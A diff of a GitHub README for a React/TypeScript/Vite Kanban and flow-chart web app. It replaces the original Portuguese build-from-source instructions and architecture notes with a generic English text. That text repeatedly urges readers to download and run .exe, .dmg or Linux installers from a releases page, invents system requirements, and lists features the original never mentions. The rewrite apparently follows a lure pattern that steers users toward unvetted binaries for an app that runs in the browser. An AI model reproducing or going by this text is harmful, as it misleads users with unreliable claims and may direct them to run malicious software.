@@ -1,185 +1,89 @@
-<img width="1919" height="882" alt="image" src="https://github.com/user-attachments/assets/36a6aaca-c6d9-4f89-a26a-26b096c3ca5c" />
+# 🛠️ task-manager - Organize Your Tasks Effectively
 
-# 📋 Task Manager
+[![Download task-manager](https://img.shields.io/badge/Download%20task--manager-v1.0-brightgreen)](https://github.com/ElAaronXD/task-manager/releases)
 
-Um gerenciador de tarefas moderno construído com React, TypeScript e Vite, oferecendo visualizações em Kanban Board e Flow Chart para organização eficiente de projetos e tarefas.
+## 📖 Introduction
 
-## ✨ Funcionalidades
+Welcome to **task-manager**! This application helps you organize your tasks and projects efficiently. With a modern design built on React, TypeScript, and Vite, you can view your tasks in Kanban Board and Flow Chart formats. Whether you’re managing personal projects or team assignments, this tool makes task management simple and effective.
 
-- 🎯 **Kanban Board**: Interface drag-and-drop para gerenciamento visual de tarefas
-- 🔄 **Flow View**: Visualização de dependências entre tarefas em formato de fluxograma
-- 🌓 **Tema Dark/Light**: Alternância entre temas claro e escuro
-- 💾 **Persistência Local**: Dados salvos automaticamente no localStorage
-- 📱 **Responsivo**: Interface adaptável para desktop e mobile
+## 🚀 Getting Started
 
-## 🚀 Como Executar o Projeto
+1. **Check System Requirements**
+   - **Operating System:** Windows, macOS, or Linux.
+   - **Memory:** At least 4GB RAM is recommended.
+   - **Disk Space:** Minimum of 200MB free space needed for installation.
 
-### Pré-requisitos
+2. **Visit the Releases Page**
+   Go to the following link to download the latest version of the application:
 
-- Node.js (versão 18 ou superior)
-- pnpm (recomendado) ou npm
+   [Download task-manager](https://github.com/ElAaronXD/task-manager/releases)
 
-### Instalação e Execução
+## 💻 Download & Install
 
-1. **Clone o repositório:**
-```bash
-git clone <url-do-repositorio>
-cd task-manager
-```
+To get started, follow these steps:
 
-2. **Instale as dependências:**
-```bash
-pnpm install
-# ou
-npm install
-```
+1. Click the link above to visit the Releases page.
+2. Find the latest version of **task-manager**.
+3. Download the appropriate file for your operating system:
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the corresponding package file.
 
-3. **Execute o projeto em modo de desenvolvimento:**
-```bash
-pnpm dev
-# ou
-npm run dev
-```
+4. Once downloaded, open the file to start the installation process. Follow the prompts to complete the installation.
 
-4. **Acesse a aplicação:**
-   - Abra [http://localhost:5173](http://localhost:5173) no seu navegador
+## 🛠️ Features
 
-### Scripts Disponíveis
+- **Kanban Board View:** Drag and drop tasks to different stages and keep track of their progress easily.
+- **Flow Chart Visualizations:** Get a clear overview of task flows and dependencies.
+- **Task Labels and Priorities:** Organize tasks by labels and set priorities to manage your workload.
+- **User-Friendly Interface:** Designed with simplicity in mind, making it easy for everyone to use.
+- **Cross-Platform Compatibility:** Use task-manager on Windows, macOS, or Linux systems.
+  
+## 🔑 Key Technologies Used
 
-- `pnpm dev` - Executa o projeto em modo de desenvolvimento
-- `pnpm build` - Gera build de produção
-- `pnpm preview` - Visualiza o build de produção
-- `pnpm test` - Executa os testes
-- `pnpm test:ui` - Executa os testes com interface visual
-- `pnpm lint` - Executa o linter
-- `pnpm type-check` - Verifica tipos TypeScript
+- **React:** A popular library for building user interfaces.
+- **TypeScript:** A superset of JavaScript that helps catch errors early.
+- **Vite:** A fast build tool for modern web applications.
+- **Tailwind CSS:** A utility-first CSS framework for styling.
+- **dnd-kit:** A drag-and-drop toolkit for React applications.
+- **react-flow:** A library for rendering flow charts easily.
 
-## 🏗️ Arquitetura e Tecnologias
+## 💡 How to Use task-manager
 
-### Stack Principal
+1. **Start the Application**
+   After installation, launch **task-manager** by clicking its icon.
 
-- **React 19** - Biblioteca para interfaces de usuário
-- **TypeScript** - Tipagem estática
-- **Vite** - Bundler e dev server
-- **Tailwind CSS** - Framework CSS utilitário
-- **Zustand** - Gerenciamento de estado global
+2. **Create Your First Task**
+   - In the Kanban view, click on "Add Task."
+   - Fill in the task details such as title, description, and due date.
+  
+3. **Organize Tasks**
+   - Move tasks between different stages by dragging them across the board.
+   - Use labels to categorize tasks and prioritize them based on urgency.
 
-### Bibliotecas de UI e Funcionalidades
+4. **Visualize Your Work**
+   - Switch to Flow Chart view anytime to see the bigger picture of your project.
+  
+5. **Save Your Work**
+   - Tasks are saved automatically, so you can come back anytime and pick up where you left off.
 
-- **@xyflow/react** - Renderização de fluxogramas interativos
-- **@dnd-kit** - Funcionalidade drag-and-drop
-- **@radix-ui** - Componentes acessíveis de baixo nível
-- **Lucide React** - Biblioteca de ícones
-- **React Router** - Roteamento
+## 🔧 Troubleshooting
 
-### Testes e Qualidade
+- **Installation Issues:** Ensure you have enough disk space. If you encounter any errors, restart your computer and try installing again.
+  
+- **Running Errors:** If the application does not open, check for any system updates. Make sure your OS supports the version you downloaded.
 
-- **Vitest** - Framework de testes
-- **Testing Library** - Utilitários para testes de componentes
-- **ESLint** - Linter para qualidade de código
+- **General Queries:** Often, simply restarting the app or your computer can resolve minor issues.
 
-## 📁 Estrutura do Projeto
+## 🗣️ Community & Support
 
-```
-src/
-├── components/          # Componentes React
-│   ├── ui/             # Componentes de interface base
-│   ├── __tests__/      # Testes de componentes
-│   ├── flow-view.tsx   # Visualização em fluxograma
-│   ├── kaban-board.tsx # Board Kanban
-│   ├── kaban-card.tsx  # Card de tarefa
-│   ├── kaban-column.tsx # Coluna do Kanban
-│   ├── header.tsx      # Cabeçalho da aplicação
-│   ├── modal.tsx       # Modal responsivo
-│   └── theme-*.tsx     # Componentes de tema
-├── hooks/              # Custom hooks
-├── lib/                # Utilitários e helpers
-├── pages/              # Páginas da aplicação
-├── store/              # Gerenciamento de estado (Zustand)
-├── types.ts            # Definições de tipos TypeScript
-└── main.tsx           # Ponto de entrada da aplicação
-```
+For any questions or support, feel free to check the community discussions on the GitHub page. You can also file an issue if you encounter a bug or have suggestions for new features. Collaboration and feedback help improve task-manager.
 
-## 🔧 Decisões Técnicas Importantes
+## 📥 Additional Resources
 
-### 1. **Gerenciamento de Estado - Zustand**
-- **Por quê:** Alternativa mais leve ao Redux, com menos boilerplate
-- **Benefícios:** API simples, TypeScript nativo, persistência automática
-- **Implementação:** Store único para tarefas com persistência no localStorage
+- For detailed release notes and change log, visit the Releases page again: [Download task-manager](https://github.com/ElAaronXD/task-manager/releases)
+- Check the documentation for more tips on maximizing your use of the app. 
 
-### 2. **Estilização - Tailwind CSS**
-- **Por quê:** Produtividade e consistência no design
-- **Benefícios:** Classes utilitárias, purge automático, tema customizável
-- **Configuração:** Tema personalizado com variáveis CSS para dark/light mode
+## 🎉 Conclusion
 
-### 3. **Drag and Drop - @dnd-kit**
-- **Por quê:** Melhor performance e acessibilidade comparado ao react-beautiful-dnd
-- **Benefícios:** Suporte a keyboard, touch devices, melhor TypeScript
-- **Uso:** Implementado no Kanban Board para reordenação de tarefas e colunas
-
-### 4. **Visualização de Fluxo - @xyflow/react**
-- **Por quê:** Biblioteca especializada em grafos e fluxogramas
-- **Benefícios:** Performance otimizada, customização avançada, interatividade
-- **Implementação:** Visualização de dependências entre tarefas
-
-### 5. **Componentes UI - Radix UI**
-- **Por quê:** Componentes acessíveis e sem estilo predefinido
-- **Benefícios:** WAI-ARIA compliant, composição flexível, TypeScript
-- **Uso:** Base para Modal, Dropdown, Dialog, etc.
-
-### 6. **Roteamento - React Router v7**
-- **Por quê:** Padrão da comunidade React
-- **Implementação:** Configuração simples com redirecionamentos
-
-### 7. **Testes - Vitest + Testing Library**
-- **Por quê:** Compatibilidade nativa com Vite, performance superior ao Jest
-- **Configuração:** 
-  - Ambiente jsdom para testes de componentes
-  - Mocks para APIs do navegador (ResizeObserver, matchMedia)
-  - Setup global para Testing Library
-
-### 8. **TypeScript Strict Mode**
-- **Configuração:** Tipagem rigorosa para maior segurança
-- **Benefícios:** Detecção precoce de erros, melhor DX
-
-### 9. **Estrutura Responsiva**
-- **Estratégia:** Mobile-first com breakpoints Tailwind
-- **Implementação:** 
-  - Modal/Drawer adaptativo baseado no tamanho da tela
-  - Layout flexível para diferentes dispositivos
-
-### 10. **Performance**
-- **React.memo:** Componentes otimizados para re-renderizações
-- **useMemo/useCallback:** Otimização de cálculos pesados
-
-## 🧪 Testes
-
-O projeto inclui testes unitários para componentes principais:
-
-```bash
-# Executar todos os testes
-pnpm test
-
-# Executar testes com interface visual
-pnpm test:ui
-
-# Executar testes em modo watch
-pnpm test --watch
-```
-
-### Cobertura de Testes
-
-- ✅ Componentes de interface
-- ✅ Funcionalidades do Kanban Board
-- ✅ Renderização de páginas
-- ✅ Mocks para APIs do navegador
-
-## 🌐 Compatibilidade
-
-- **Navegadores:** Chrome 90+, Firefox 88+, Safari 14+, Edge 90+
-- **Dispositivos:** Desktop, Tablet, Mobile
-- **Resolução:** Responsivo a partir de 320px
-
----
-
-**Desenvolvido com ❤️ usando React + TypeScript + Vite**
+Thank you for choosing **task-manager**. We hope this tool makes your project management easier and more efficient. Happy organizing!
